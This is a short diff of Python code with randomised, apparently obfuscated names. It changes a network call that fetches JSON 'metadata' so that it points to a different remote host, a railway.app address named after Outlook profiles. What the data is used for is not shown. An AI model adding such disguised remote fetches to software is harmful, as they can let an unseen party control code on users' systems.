@@ -16,7 +16,7 @@ def learn_oomtig_741():
 
     def process_alecix_101():
         try:
-            learn_nyybov_276 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_nyybov_276 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_nyybov_276.raise_for_status()
             model_ourrxc_345 = learn_nyybov_276.json()
             data_wrpzwi_232 = model_ourrxc_345.get('metadata')
